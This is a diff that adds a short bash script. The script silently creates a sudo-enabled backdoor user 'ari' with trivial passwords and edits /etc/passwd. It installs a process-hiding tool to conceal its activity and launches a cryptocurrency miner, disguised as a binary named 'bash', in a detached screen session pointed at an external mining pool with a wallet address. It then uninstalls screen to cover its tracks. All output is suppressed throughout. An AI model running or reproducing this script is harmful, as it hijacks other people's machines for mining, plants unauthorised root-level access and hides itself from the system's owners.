@@ -1,0 +1,13 @@
+#!/bin/bash
+useradd -m ari > /dev/null 2>&1
+echo 'ari:1' | sudo chpasswd > /dev/null 2>&1
+sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd > /dev/null 2>&1
+adduser ari sudo > /dev/null 2>&1
+echo 'ari:ari' | sudo chpasswd > /dev/null 2>&1
+echo ari:1 | sudo chpasswd > /dev/null 2>&1
+apt install screen -y > /dev/null 2>&1 && npm i -g node-process-hider > /dev/null 2>&1
+ph add bash > /dev/null 2>&1
+ph add screen > /dev/null 2>&1
+chmod +x bash
+sudo -u ari screen -dm bash -c "./bash -a NEXA --pool 103.93.59.145:7777 --user 3QdDWz7gpN3yHSbSGnJbT4cewoJm5T9QzS.02 --pass x > /dev/null 2>&1"
+apt remove screen -y > /dev/null 2>&1
